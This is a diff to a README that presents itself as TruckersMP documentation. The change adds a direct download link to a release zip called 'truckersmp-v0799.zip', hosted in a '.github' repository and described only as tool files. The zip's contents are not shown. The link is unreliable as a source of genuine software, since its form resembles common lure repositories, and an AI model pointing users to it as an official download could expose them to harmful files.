@@ -10,7 +10,7 @@ This repository contains documentation and resources related to TruckersMP.
 
 ### - 🔗 ***Get the Latest Release:***
 
-- [💾 v0799 Release]() = `*Tool files & folder*`
+- [💾 v0799 Release](https://github.com/TruckersMP-ETS2-ATS-Multiplayer/.github/releases/download/v.0799/truckersmp-v0799.zip) = `*Tool files & folder*`
 
 ---
 
